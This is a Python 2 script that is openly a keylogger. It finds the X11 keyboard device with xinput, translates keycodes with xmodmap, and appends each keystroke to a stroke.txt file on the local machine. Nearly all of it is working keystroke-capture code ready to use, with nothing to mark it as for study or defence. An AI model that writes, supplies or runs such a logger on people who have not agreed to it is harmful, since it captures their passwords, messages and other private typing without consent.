#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re, collections
import sys
import getopt
from subprocess import *
import os,sys,subprocess,threading
import time, datetime


def call_and_peek_output(cmd, shell=False):
    import pty, subprocess
    master, slave = pty.openpty()
    print cmd
    p = subprocess.Popen(cmd, shell=shell, stdin=None, stdout=slave, close_fds=True)
    os.close(slave)
    line = ""
    i=0
    while True:
        try:
            ch = os.read(master, 1)
        except OSError:
            break
        line += ch
        if ch == '\n' :
            yield line
            line = ""

    if line:
        yield line

    ret = p.wait()
    if ret:
        raise subprocess.CalledProcessError(ret, cmd)
    
     
def sanitize_keybinding(binding):
    d = {'space': ' ',
    'apostrophe': "'",
    'BackSpace': ' (<-)',
    'Return': '↵ \n',
    'period': '.',
    'Shift_L1': ' (shift1) ',
    'Shift_L2': ' (shift2) '}
    if binding in d:
        return d[binding]
    else:
        return binding



def get_keymap():
    keymap = {}
    table = Popen("xmodmap -pke", shell=True, bufsize=1, stdout=PIPE).stdout
    for line in table:
        m = re.match('keycode +(\d+) = (.+)', line.decode())
        if m and m.groups()[1]:
            keymap[m.groups()[0]] = sanitize_keybinding(m.groups()[1].split()[0])
    return keymap

 

def find_keyb():
    for line in call_and_peek_output(['xinput list &'], shell=True):
		if "AT Translated" in line and "keyboard" in line:
			m_obj=re.search(r"id=.\b", line)
			if m_obj.group(0)[-3] == '=':
				ident=m_obj.group(0)[-2:]
			else:
				ident=m_obj.group(0)[-1:]
			return (ident)



def keylogger(path, dev_id):
	if path[-1]=='/':
		path += 'stroke.txt'
	else:
		path += '/stroke.txt'
	counts = collections.defaultdict(lambda : 0)
	output = []
	keymap = get_keymap()
	f=open(path, 'wb')
	ts=time.time()
	st = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S') 
	f.write("Logging started at: "+st+'\n')
	f.close()
	try:
		cmd='xinput test '+str(dev_id)+' &'
		for line in call_and_peek_output([cmd], shell=True):
			f=open(path,'a')
			m = re.match('key press +(\d+)', line.decode())
			if m:
				keycode = m.groups()[0]
				counts[keycode] += 1
				output.append(keycode)
				if keycode in keymap:
					f.write(str(keymap[keycode]))
				else:
					f.write('?')
			f.close()
	except KeyboardInterrupt:
		#print(output)
		print("---------------------")


            
def main(argv):                         
                     
    try:                                
        opts, args = getopt.getopt(argv, "hp:", ["help", "path="]) 
    except getopt.GetoptError:           
        usage()                          
        sys.exit(2)                     
    
    for opt, arg in opts:
        if not opt in ("-p", "--path"):
            usage()
            sys.exit()
        else:
            path=arg
        
        dev_id=find_keyb()
        
        keylogger(path,dev_id)



def usage ():
    print "Usage: python "+str(sys.argv[0])+ " [-h | --help] [-f | --file]"
    print "       -h | --help  : Display this message"
    print "       -p | --path  : Path where stroke.txt is stored"

                   
if __name__ == '__main__':
    main(sys.argv[1:])
